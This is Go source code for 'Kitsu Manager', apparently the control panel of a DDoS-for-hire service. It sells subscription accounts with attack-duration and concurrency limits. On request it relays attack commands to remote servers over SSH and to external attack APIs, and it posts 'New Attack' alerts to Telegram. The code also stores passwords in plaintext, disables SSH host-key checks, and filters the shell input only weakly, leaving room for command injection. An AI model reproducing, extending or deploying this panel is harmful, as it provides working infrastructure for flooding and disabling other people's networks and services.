package main

// ! Fully made by t.me/lilsheepyy

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/openpgp"
	"golang.org/x/crypto/openpgp/armor"
)

// TODO: Add api support
var (
	db  *sql.DB
	cfg Config
)

type PanelData struct {
	Users []User
}

type User struct {
	Username    string
	Password    string
	MaxDuration string
	Concurrents string
	Expire      string
	Powersaving string
}

type Config struct {
	GlobalMaxConcurrents int             `json:"globalMaxConcurrents"`
	SessionKey           string          `json:"sessionKey"`
	Database             DatabaseConfig  `json:"database"`
	Servers              []ServerConfig  `json:"servers"`
	Methods              []MethodConfig  `json:"methods"`
	TelegramBotToken     string          `json:"telegramBotToken"`
	TelegramChatID       int64           `json:"telegramChatID"`
	Blacklist            BlacklistConfig `json:"blacklist"`
	ListenPort           int             `json:"listenPort"`
	SSLCertPath          string          `json:"sslCertPath"`
	SSLKeyPath           string          `json:"sslKeyPath"`
}

type BlacklistConfig struct {
	IPs     []string `json:"ips"`
	Subnets []string `json:"subnets"`
	Ports   []int    `json:"ports"`
	TLDs    []string `json:"tlds"`
}

type DatabaseConfig struct {
	Path string `json:"path"`
}

type ServerConfig struct {
	Config struct {
		Host     string `json:"host"`
		Port     int    `json:"port"`
		Username string `json:"username"`
		Password string `json:"password"`
	} `json:"config"`
}

type MethodConfig struct {
	Name    string   `json:"name"`
	Command string   `json:"command"`
	APIs    []string `json:"apis"`
}

var (
	bot *tgbotapi.BotAPI
)

const (
	licenseFile      = "license.key"
	publicKeyFile    = "license_public.asc"
	licenseUserAgent = "WoolCNC-License-Client"
	licenseServerURL = "http://54.36.208.152:1234"
)

func validateLicense() error {
	licData, err := os.ReadFile(licenseFile)
	if err != nil {
		return fmt.Errorf("read license file: %w", err)
	}

	keyFile, err := os.Open(publicKeyFile)
	if err != nil {
		return fmt.Errorf("open public key: %w", err)
	}
	defer keyFile.Close()

	entities, err := openpgp.ReadArmoredKeyRing(keyFile)
	if err != nil {
		return fmt.Errorf("read public key: %w", err)
	}

	var buf bytes.Buffer
	aw, err := armor.Encode(&buf, "PGP MESSAGE", nil)
	if err != nil {
		return fmt.Errorf("armor encode: %w", err)
	}
	w, err := openpgp.Encrypt(aw, entities, nil, nil, nil)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}
	if _, err := w.Write(licData); err != nil {
		return fmt.Errorf("write encrypted: %w", err)
	}
	w.Close()
	aw.Close()

	serverID, _ := os.Hostname()
	params := url.Values{}
	params.Set("data", buf.String())
	params.Set("server", serverID)

	reqURL := fmt.Sprintf("%s/validate?%s", licenseServerURL, params.Encode())
	req, err := http.NewRequest(http.MethodGet, reqURL, nil)
	if err != nil {
		return fmt.Errorf("request failed")
	}
	req.Header.Set("User-Agent", licenseUserAgent)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("request failed")
	}
	defer resp.Body.Close()

	var res struct{ Valid bool }
	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
		return fmt.Errorf("decode response: %w", err)
	}
	if !res.Valid {
		return fmt.Errorf("invalid license")
	}
	return nil
}

func init() {

	// Load the config.json
	var err error
	file, err := os.ReadFile("assets/config.json")
	if err != nil {
		log.Fatalf("Error reading config file: %v", err)
	}
	err = json.Unmarshal(file, &cfg)
	if err != nil {
		log.Fatalf("Error parsing config file: %v", err)
	}

	if err := validateLicense(); err != nil {
		log.Fatal("License validation failed")
	}

	// Initialize the database connection using sqlite3
	db, err = sql.Open("sqlite3", cfg.Database.Path)
	if err != nil {
		log.Fatalf("Error connecting to database: %v", err)
	}
	if err := createTables(); err != nil {
		log.Fatalf("Error creating tables: %v", err)
	}
	log.Println("\033[35mConnected to the database\033[0m")

	// Initialize the Telegram bot if token is provided
	if cfg.TelegramBotToken != "" {
		bot, err = tgbotapi.NewBotAPI(cfg.TelegramBotToken)
		if err != nil {
			log.Printf("Error creating Telegram bot: %v", err)
		}
	} else {
		log.Println("Telegram bot token not provided, notifications disabled")
	}
}

func main() {

	cyan := "\033[36m"
	reset := "\033[0m"
	magenta := "\033[35m"

	log.Println(cyan + "Kitsu Manager Started" + reset)
	log.Println(magenta + "Coded by t.me/lilsheepyy" + reset)
	http.HandleFunc("/api", handleAPI)
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/credits", handleCredits)
	http.HandleFunc("/panel", handlePanel)
	http.HandleFunc("/login", handleLogin)

	port := cfg.ListenPort
	if port == 0 {
		port = 80
	}
	addr := fmt.Sprintf(":%d", port)
	if cfg.SSLCertPath != "" && cfg.SSLKeyPath != "" {
		log.Fatal(http.ListenAndServeTLS(addr, cfg.SSLCertPath, cfg.SSLKeyPath, nil))
	}
	log.Fatal(http.ListenAndServe(addr, nil))
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		http.ServeFile(w, r, "assets/login.html")
		return
	}

	if r.Method == http.MethodPost {
		key := r.FormValue("key")

		if key != cfg.SessionKey {
			http.Error(w, "Invalid key", http.StatusUnauthorized)
			return
		}

		// Cokie for login
		http.SetCookie(w, &http.Cookie{
			Name:  "session",
			Value: key,
			Path:  "/",
		})

		http.Redirect(w, r, "/panel", http.StatusSeeOther)
		return
	}

	http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
}

func handlePanel(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("session")
	if err != nil || cookie.Value != cfg.SessionKey {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}

	if r.Method == http.MethodGet {
		rows, err := db.Query("SELECT username, secret, maxduration, concurrents, expire, powersaving FROM users")
		if err != nil {
			http.Error(w, "Failed to retrieve users", http.StatusInternalServerError)
			return
		}
		defer rows.Close()

		var users []User
		for rows.Next() {
			var user User
			if err := rows.Scan(&user.Username, &user.Password, &user.MaxDuration, &user.Concurrents, &user.Expire, &user.Powersaving); err != nil {
				http.Error(w, "Failed to retrieve users", http.StatusInternalServerError)
				return
			}
			users = append(users, user)
		}

		data := PanelData{Users: users}

		tmpl, err := template.ParseFiles("assets/panel.html")
		if err != nil {
			http.Error(w, "Failed to load template", http.StatusInternalServerError)
			return
		}
		tmpl.Execute(w, data)
		return
	}

	if r.Method == http.MethodPost {
		if r.FormValue("action") == "add" {
			username := r.FormValue("username")
			password := r.FormValue("password")
			maxDuration := r.FormValue("maxduration")
			concurrents := r.FormValue("concurrents")
			expire := r.FormValue("expire")
			powersaving := r.FormValue("powersaving")

			if username == "" || password == "" || maxDuration == "" || concurrents == "" || expire == "" {
				http.Error(w, "All fields are required", http.StatusBadRequest)
				return
			}

			var existingUser string
			err := db.QueryRow("SELECT username FROM users WHERE username = ?", username).Scan(&existingUser)
			if err != nil && err != sql.ErrNoRows {
				http.Error(w, "Failed to check existing users", http.StatusInternalServerError)
				return
			}

			if existingUser != "" {
				http.Error(w, "User already exists", http.StatusConflict)
				return
			}

			_, err = db.Exec("INSERT INTO users (username, secret, maxduration, concurrents, expire, powersaving) VALUES (?, ?, ?, ?, ?, ?)",
				username, password, maxDuration, concurrents, expire, powersaving)
			if err != nil {
				log.Printf("Error adding user: %v", err)
				http.Error(w, "Failed to add user", http.StatusInternalServerError)
				return
			}

			http.Redirect(w, r, "/panel", http.StatusSeeOther)
			return
		} else if r.FormValue("action") == "delete" {
			username := r.FormValue("username")

			if username == "" {
				http.Error(w, "Username is required", http.StatusBadRequest)
				return
			}

			_, err := db.Exec("DELETE FROM users WHERE username = ?", username)
			if err != nil {
				http.Error(w, "Failed to delete user", http.StatusInternalServerError)
				return
			}

			http.Redirect(w, r, "/panel", http.StatusSeeOther)
			return
		}
	}
}

func handleCredits(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Made by t.me/lilsheepyy"))
}

func handleAPI(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	target := r.URL.Query().Get("target")
	port := r.URL.Query().Get("port")
	duration := r.URL.Query().Get("duration")
	method := r.URL.Query().Get("method")
	username := r.URL.Query().Get("username")
	key := r.URL.Query().Get("key")

	// Validate input incase someone tries to send bad characters!
	if BannedCharacters(target, port, duration, method, username, key) {
		jsonError(w, http.StatusBadRequest)
		return
	}

	if target == "" || port == "" || duration == "" || method == "" || username == "" || key == "" {
		jsonError(w, http.StatusBadRequest)
		return
	}

	portInt, err := strconv.Atoi(port)
	if err != nil {
		jsonError(w, http.StatusBadRequest)
		return
	}

	durationInt, err := strconv.Atoi(duration)
	if err != nil {
		jsonError(w, http.StatusBadRequest)
		return
	}

	if !isValidUser(username, key) {
		jsonError(w, http.StatusUnauthorized)
		return
	}

	if isIPBlacklisted(target, cfg.Blacklist.IPs, cfg.Blacklist.Subnets) {
		jsonError(w, http.StatusForbidden)
		return
	}

	if isTLDBlacklisted(target, cfg.Blacklist.TLDs) {
		jsonError(w, http.StatusForbidden)
		return
	}

	if isPortBlacklisted(portInt, cfg.Blacklist.Ports) {
		jsonError(w, http.StatusForbidden)
		return
	}

	if err := isUserAllowed(username, durationInt, target); err != nil {
		jsonError(w, http.StatusForbidden)
		return
	}

	logID, err := logRequest(username, target, portInt, durationInt, method)
	if err != nil {
		log.Printf("Failed to log request for user %s. Target: %s, Port: %d, Duration: %d, Method: %s. Error: %v",
			username, target, portInt, durationInt, method, err)
		jsonError(w, http.StatusInternalServerError)
		return
	}

	// Send notification to Telegram if bot is configured
	if bot != nil && cfg.TelegramChatID != 0 {
		msg := fmt.Sprintf("New Attack:\nUser: %s\nTarget: %s\nPort: %d\nDuration: %d seconds\nMethod: %s",
			username, target, portInt, durationInt, method)
		telegramMsg := tgbotapi.NewMessage(cfg.TelegramChatID, msg)
		if _, err := bot.Send(telegramMsg); err != nil {
			log.Printf("Failed to send Telegram message: %v", err)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	resp := struct {
		Error    bool   `json:"error"`
		Target   string `json:"target"`
		Port     int    `json:"port"`
		Duration int    `json:"duration"`
		Method   string `json:"method"`
	}{false, target, portInt, durationInt, method}
	json.NewEncoder(w).Encode(resp)

	go func() {
		if err := executeCommands(target, portInt, durationInt, method, logID); err != nil {
			log.Printf("Failed to execute commands for logID %d. Error: %v", logID, err)
		}
		if err := updateEndTime(logID); err != nil {
			log.Printf("Failed to update end time for logID %d. Error: %v", logID, err)
		}
	}()
}

func jsonError(w http.ResponseWriter, status int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(struct {
		Error bool `json:"error"`
	}{true})
}

func BannedCharacters(values ...string) bool {
	bannedChars := []rune{';', ',', '$'}
	for _, value := range values {
		for _, char := range bannedChars {
			if strings.ContainsRune(value, char) {
				return true
			}
		}
	}
	return false
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "assets/index.html")
}

func isValidUser(username, key string) bool {
	// Yes the password is stored in plain, just don´t use path as host this and itll be fine!
	var storedPassword string
	err := db.QueryRow("SELECT secret FROM users WHERE username = ?", username).Scan(&storedPassword)
	if err != nil {
		log.Printf("Error querying user password: %v", err)
		return false
	}

	return storedPassword == key
}

func isUserAllowed(username string, duration int, target string) error {
	var maxDuration, concurrents, expireStr, powersaving string
	err := db.QueryRow("SELECT maxduration, concurrents, expire, powersaving FROM users WHERE username = ?", username).
		Scan(&maxDuration, &concurrents, &expireStr, &powersaving)
	if err != nil {
		log.Printf("Error querying user data: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	maxDurationInt, err := strconv.Atoi(maxDuration)
	if err != nil {
		log.Printf("Error converting maxDuration to int: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	concurrentsInt, err := strconv.Atoi(concurrents)
	if err != nil {
		log.Printf("Error converting concurrents to int: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	if duration > maxDurationInt {
		return fmt.Errorf("requested duration exceeds allowed limit")
	}

	expireDate, err := time.Parse("02-01-2006", expireStr)
	if err != nil {
		log.Printf("Error parsing expire date: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	if time.Now().After(expireDate) {
		return fmt.Errorf("user account has expired")
	}

	var activeAttacks int
	err = db.QueryRow("SELECT COUNT(*) FROM logs WHERE username = ? AND end_time IS NULL", username).Scan(&activeAttacks)
	if err != nil {
		log.Printf("Error querying active attacks: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	if activeAttacks >= concurrentsInt {
		return fmt.Errorf("Maximum number of concurrent attacks for user exceeded")
	}

	var globalActiveAttacks int
	err = db.QueryRow("SELECT COUNT(*) FROM logs WHERE end_time IS NULL").Scan(&globalActiveAttacks)
	if err != nil {
		log.Printf("Error querying global active attacks: %v", err)
		return fmt.Errorf("internal error checking global attack limit")
	}

	if globalActiveAttacks >= cfg.GlobalMaxConcurrents {
		return fmt.Errorf("maximum global attacks reached")
	}

	// Powersaving check
	if powersaving == "true" {
		var activeAttackToTarget int
		err = db.QueryRow("SELECT COUNT(*) FROM logs WHERE username = ? AND host = ? AND end_time IS NULL", username, target).
			Scan(&activeAttackToTarget)
		if err != nil {
			log.Printf("Error querying active attacks to target: %v", err)
			return fmt.Errorf("internal error checking user permissions")
		}

		if activeAttackToTarget > 0 {
			return fmt.Errorf("User has an active attack to this target in powersaving mode")
		}
	}

	return nil
}

func isIPBlacklisted(target string, blacklistIPs []string, blacklistSubnets []string) bool {
	for _, ip := range blacklistIPs {
		if target == ip {
			return true
		}
	}

	for _, subnet := range blacklistSubnets {
		_, subnetNet, err := net.ParseCIDR(subnet)
		if err != nil {
			log.Printf("Error parsing CIDR subnet %s: %v", subnet, err)
			continue
		}

		if subnetNet.Contains(net.ParseIP(target)) {
			return true
		}
	}

	return false
}

func isTLDBlacklisted(target string, blacklistTLDs []string) bool {
	targetLower := strings.ToLower(target)
	for _, tld := range blacklistTLDs {
		cleanTLD := strings.ToLower(strings.TrimPrefix(tld, "."))
		if strings.HasSuffix(targetLower, "."+cleanTLD) {
			return true
		}
	}
	return false
}

func isPortBlacklisted(port int, blacklistPorts []int) bool {
	for _, blacklistedPort := range blacklistPorts {
		if port == blacklistedPort {
			return true
		}
	}
	return false
}

func logRequest(username, target string, port, duration int, method string) (int, error) {
	result, err := db.Exec("INSERT INTO logs (username, host, port, duration, method, time_sent) VALUES (?, ?, ?, ?, ?, ?)",
		username, target, port, duration, method, time.Now().Unix())
	if err != nil {
		return 0, err
	}

	lastInsertID, err := result.LastInsertId()
	if err != nil {
		return 0, err
	}

	return int(lastInsertID), nil
}

func executeCommands(target string, port, duration int, method string, logID int) error {
	var (
		cmdTemplate  string
		apiTemplates []string
	)
	for _, methodCfg := range cfg.Methods {
		if methodCfg.Name == method {
			cmdTemplate = methodCfg.Command
			apiTemplates = methodCfg.APIs
			break
		}
	}
	if cmdTemplate == "" {
		return fmt.Errorf("method not found")
	}

	methodUpper := strings.ToUpper(method)
	replacer := strings.NewReplacer(
		"{IP}", target,
		"{ip}", target,
		"{PORT}", strconv.Itoa(port),
		"{port}", strconv.Itoa(port),
		"{DURATION}", strconv.Itoa(duration),
		"{duration}", strconv.Itoa(duration),
		"{METHOD}", methodUpper,
		"{method}", methodUpper,
	)
	cmd := replacer.Replace(cmdTemplate)

	for _, serverCfg := range cfg.Servers {
		server := serverCfg.Config

		sshArgs := []string{
			"sshpass", "-p", server.Password,
			"ssh",
			"-o", "StrictHostKeyChecking=no",
			"-p", strconv.Itoa(server.Port),
			fmt.Sprintf("%s@%s", server.Username, server.Host),
			cmd,
		}

		execCmd := exec.Command(sshArgs[0], sshArgs[1:]...)
		output, err := execCmd.CombinedOutput()
		if err != nil {
			log.Printf("failed to execute command on server %s: %v. Output: %s", server.Host, err, string(output))
			continue
		}
	}

	for _, apiT := range apiTemplates {
		apiURL := replacer.Replace(apiT)
		log.Printf("calling API: %s", apiURL)
		resp, err := http.Get(apiURL)
		if err != nil {
			log.Printf("failed to call api %s: %v", apiURL, err)
			continue
		}
		log.Printf("api %s responded with status %s", apiURL, resp.Status)
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}

	time.Sleep(time.Duration(duration) * time.Second)

	return nil
}

func updateEndTime(logID int) error {
	_, err := db.Exec("UPDATE logs SET end_time = ? WHERE id = ?", time.Now().Unix(), logID)
	return err
}

func createTables() error {
	logsTable := `CREATE TABLE IF NOT EXISTS logs (
               id INTEGER PRIMARY KEY AUTOINCREMENT,
               username TEXT NOT NULL,
               host TEXT NOT NULL,
               port INTEGER NOT NULL,
               duration INTEGER NOT NULL,
               method TEXT NOT NULL,
               time_sent INTEGER NOT NULL,
               end_time INTEGER
       );`

	usersTable := `CREATE TABLE IF NOT EXISTS users (
               id INTEGER PRIMARY KEY AUTOINCREMENT,
               username TEXT NOT NULL,
               secret TEXT NOT NULL,
               maxduration INTEGER NOT NULL,
               concurrents INTEGER NOT NULL,
               expire TEXT NOT NULL,
               powersaving TEXT NOT NULL
       );`

	if _, err := db.Exec(logsTable); err != nil {
		return err
	}
	if _, err := db.Exec(usersTable); err != nil {
		return err
	}
	return nil
}
